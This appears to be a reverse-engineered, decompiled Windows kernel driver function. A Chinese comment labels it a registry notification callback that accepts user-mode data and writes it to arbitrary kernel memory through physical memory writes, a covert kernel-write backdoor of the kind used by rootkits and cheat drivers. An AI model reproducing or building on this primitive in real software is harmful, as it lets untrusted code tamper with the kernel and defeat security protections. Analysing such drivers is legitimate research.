// RegNotifyCallback  0x14000D0B0  518 bytes
// 注册表通知回调。从用户态接收注册表写入数据，通过物理内存写入方式修改内核内存。
char __fastcall RegNotifyCallback(PVOID *Address, int InputSize)
{
  unsigned int DataSize; // eax
  PVOID UserDataPtr; // rcx
  PVOID AllocBuffer; // rax
  struct _KPROCESS *TargetProcess; // rbx
  char Result; // [rsp+30h] [rbp-68h]
  char DiskSectorsAllocated; // [rsp+31h] [rbp-67h]
  char IsSystemModule; // [rsp+32h] [rbp-66h]
  unsigned int CopySize; // [rsp+34h] [rbp-64h]
  char *TargetAddress; // [rsp+38h] [rbp-60h]
  struct _KPROCESS *AttachedProcess; // [rsp+40h] [rbp-58h]
  void *Buffer; // [rsp+48h] [rbp-50h]
  struct _KAPC_STATE ApcState; // [rsp+50h] [rbp-48h] BYREF

  Result = 0;
  AttachedProcess = 0;
  if ( InputSize == 24 )
  {
    if ( Address )
    {
      if ( (unsigned __int64)Address < MmUserProbeAddress && (unsigned __int64)(Address + 3) < MmUserProbeAddress )
      {
        ProbeForRead(Address, 0x18u, 4u);
        if ( *Address > MmSystemRangeStart )
        {
          DataSize = *((_DWORD *)Address + 2);
          if ( DataSize )
          {
            if ( DataSize < MmUserProbeAddress )
            {
              UserDataPtr = Address[2];
              if ( UserDataPtr )
              {
                if ( (unsigned __int64)UserDataPtr < MmUserProbeAddress
                  && (unsigned __int64)UserDataPtr + DataSize < MmUserProbeAddress )
                {
                  ProbeForRead(UserDataPtr, DataSize, 1u);
                  AllocBuffer = ExAlloc(NonPagedPool, *((unsigned int *)Address + 2));
                  Buffer = AllocBuffer;
                  if ( AllocBuffer )
                  {
                    memmove(AllocBuffer, Address[2], *((unsigned int *)Address + 2));
                    TargetAddress = (char *)*Address;
                    CopySize = *((_DWORD *)Address + 2);
                    IsSystemModule = CheckAddressInSystemModuleRange((unsigned __int64)*Address);
                    DiskSectorsAllocated = 0;
                    if ( IsSystemModule )
                    {
                      DiskSectorsAllocated = ReadDiskSectorsWithAlloc((__int64)&ApcState);
                    }
                    else
                    {
                      TargetProcess = (struct _KPROCESS *)GtRead(GtCurrentEprocess);
                      if ( IoGetCurrentProcess() == TargetProcess )
                        TargetProcess = 0;
                      AttachedProcess = TargetProcess;
                      if ( TargetProcess )
                        KeStackAttachProcess(TargetProcess, &ApcState);
                    }
                    if ( MmIsAddressValid(TargetAddress) == 1 && MmIsAddressValid(&TargetAddress[CopySize - 1]) == 1 )
                      Result = WritePhysicalMemoryBuffer((unsigned __int64)TargetAddress, Buffer, CopySize, 0, 0);
                    if ( IsSystemModule )
                    {
                      if ( DiskSectorsAllocated == 1 )
                        ReleaseDiskBuffer((__int64)&ApcState);
                    }
                    else if ( AttachedProcess )
                    {
                      KeUnstackDetachProcess(&ApcState);
                    }
                    ExFree(Buffer);
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return Result;
}
